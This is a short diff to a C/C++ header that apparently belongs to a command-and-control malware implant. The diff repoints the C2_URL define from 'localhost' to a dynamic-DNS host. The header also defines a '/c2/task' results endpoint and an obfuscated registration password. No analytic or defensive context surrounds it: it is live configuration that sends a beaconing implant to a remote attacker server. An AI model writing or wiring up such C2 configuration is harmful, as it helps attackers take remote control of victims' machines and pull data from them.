@@ -6,7 +6,7 @@
 #endif
 
 #define CONTENT_TYPE_JSON L"Content-Type: application/json"
-#define C2_URL L"localhost"
+#define C2_URL L"kjh2iur80in12rjfbjn.ddns.net"
 #define TASK_RESULTS_ENDPOINT L"/c2/task"
 #define C2_REGISTER_PASSWORD OBFUSCATED("IhylxF8CXAauMoJGuSoF0VEVl4nwTEhw")
 
